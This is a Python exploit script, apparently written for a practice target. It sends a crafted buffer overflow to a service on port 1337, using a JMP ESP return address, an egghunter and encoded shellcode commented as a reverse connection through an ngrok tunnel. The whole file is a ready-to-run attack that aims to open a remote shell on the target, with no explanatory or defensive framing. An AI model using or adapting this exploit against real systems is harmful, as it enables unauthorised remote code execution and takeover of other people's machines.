import sys, socket
from time import sleep

ip = sys.argv[1]
port = 1337

offset = 524
retn = b"\xe8\x12\x50\x62"  # JMP ESP at 0x625012E8

egg = b"w00tw00t"  # Marca
egghunter = b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += b"\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

# ngrok tcp connect
shellcode =  b""
shellcode += b"\xda\xdd\xba\x35\xe5\x95\x84\xd9\x74\x24\xf4"
shellcode += b"\x5e\x2b\xc9\xb1\x52\x31\x56\x17\x03\x56\x17"
shellcode += b"\x83\xdb\x19\x77\x71\xdf\x0a\xfa\x7a\x1f\xcb"
shellcode += b"\x9b\xf3\xfa\xfa\x9b\x60\x8f\xad\x2b\xe2\xdd"
shellcode += b"\x41\xc7\xa6\xf5\xd2\xa5\x6e\xfa\x53\x03\x49"
shellcode += b"\x35\x63\x38\xa9\x54\xe7\x43\xfe\xb6\xd6\x8b"
shellcode += b"\xf3\xb7\x1f\xf1\xfe\xe5\xc8\x7d\xac\x19\x7c"
shellcode += b"\xcb\x6d\x92\xce\xdd\xf5\x47\x86\xdc\xd4\xd6"
shellcode += b"\x9c\x86\xf6\xd9\x71\xb3\xbe\xc1\x96\xfe\x09"
shellcode += b"\x7a\x6c\x74\x88\xaa\xbc\x75\x27\x93\x70\x84"
shellcode += b"\x39\xd4\xb7\x77\x4c\x2c\xc4\x0a\x57\xeb\xb6"
shellcode += b"\xd0\xd2\xef\x11\x92\x45\xcb\xa0\x77\x13\x98"
shellcode += b"\xaf\x3c\x57\xc6\xb3\xc3\xb4\x7d\xcf\x48\x3b"
shellcode += b"\x51\x59\x0a\x18\x75\x01\xc8\x01\x2c\xef\xbf"
shellcode += b"\x3e\x2e\x50\x1f\x9b\x25\x7d\x74\x96\x64\xea"
shellcode += b"\xb9\x9b\x96\xea\xd5\xac\xe5\xd8\x7a\x07\x61"
shellcode += b"\x51\xf2\x81\x76\x96\x29\x75\xe8\x69\xd2\x86"
shellcode += b"\x21\xae\x86\xd6\x59\x07\xa7\xbc\x99\xa8\x72"
shellcode += b"\x12\xc9\x06\x2d\xd3\xb9\xe6\x9d\xbb\xd3\xe8"
shellcode += b"\xc2\xdc\xdc\x22\x6b\x76\x27\xa5\x86\x63\x75"
shellcode += b"\x09\xcf\x69\x79\x38\x9f\xe7\x9f\xd0\x8f\xa1"
shellcode += b"\x08\x4d\x29\xe8\xc2\xec\xb6\x26\xaf\x2f\x3c"
shellcode += b"\xc5\x50\xe1\xb5\xa0\x42\x96\x35\xff\x38\x31"
shellcode += b"\x49\xd5\x54\xdd\xd8\xb2\xa4\xa8\xc0\x6c\xf3"
shellcode += b"\xfd\x37\x65\x91\x13\x61\xdf\x87\xe9\xf7\x18"
shellcode += b"\x03\x36\xc4\xa7\x8a\xbb\x70\x8c\x9c\x05\x78"
shellcode += b"\x88\xc8\xd9\x2f\x46\xa6\x9f\x99\x28\x10\x76"
shellcode += b"\x75\xe3\xf4\x0f\xb5\x34\x82\x0f\x90\xc2\x6a"
shellcode += b"\xa1\x4d\x93\x95\x0e\x1a\x13\xee\x72\xba\xdc"
shellcode += b"\x25\x37\xca\x96\x67\x1e\x43\x7f\xf2\x22\x0e"
shellcode += b"\x80\x29\x60\x37\x03\xdb\x19\xcc\x1b\xae\x1c"
shellcode += b"\x88\x9b\x43\x6d\x81\x49\x63\xc2\xa2\x5b"

payload = egg + shellcode + b"A" * (offset - len(shellcode) - len(egg)) + retn

exploit = payload + b"\x90" * 16 + egghunter + b"\x90" * (136 - len(payload) - len(egghunter) - 16)

p = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    p.connect((ip, port))

    welcome = p.recv(1024)
    print(f"{welcome.decode(errors='ignore').strip()}")

    p.send(exploit + b"\r\n")

    sleep(2)
    p.close()

except ConnectionRefusedError as e:
    print(f"Connection refused: {e}")
except TimeoutError as e:
    print(f"Connection timed out: {e}")
except EOFError as e:
    print(f"Connection closed unexpectedly: {e}")
except socket.gaierror as e:
    print(f"Address-related error: {e}")
except socket.error as e:
    print(f"Socket error: {e}")
except Exception as e:
    print(f"Connection failed: {e}")
